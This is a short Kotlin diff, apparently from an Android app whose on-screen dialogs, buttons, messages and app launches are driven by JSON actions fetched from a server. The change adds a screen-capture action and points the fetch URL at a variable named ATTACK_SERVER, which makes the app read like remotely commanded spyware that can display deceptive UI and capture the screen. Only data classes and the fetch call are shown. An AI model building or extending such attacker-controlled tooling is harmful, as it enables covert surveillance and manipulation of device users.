@@ -46,11 +46,16 @@ data class AppData(
     var delay: Long = 0
 )
 
+data class CaptureScreenData(
+    var delay: Long = 0
+)
+
 data class ViewCliTemplate(
     var dialogs: List<DialogData> = ArrayList(),
     var buttons: List<ButtonData> = ArrayList(),
     var messages: List<MessageData> = ArrayList(),
-    var openApp: List<AppData> = ArrayList()
+    var openApp: List<AppData> = ArrayList(),
+    var captureScreen: List<CaptureScreenData> = ArrayList()
 )
 
 // 使用 OkHttp 获取 JSON 数据
@@ -76,7 +81,7 @@ fun fetchViewCli(action: String, onResult: (ViewCliTemplate) -> Unit) {
     object : AsyncTask<Void, Void, ViewCliTemplate>() {
         override fun doInBackground(vararg params: Void?): ViewCliTemplate {
             return try {
-                val url = "http://10.0.2.2:8080/action/$action"  // 替换为实际 URL
+                val url = "$ATTACK_SERVER/action/$action"  // 替换为实际 URL
                 val jsonResponse = fetchJsonFromUrl(url)
                 parseJson(jsonResponse)
             } catch (e: Exception) {
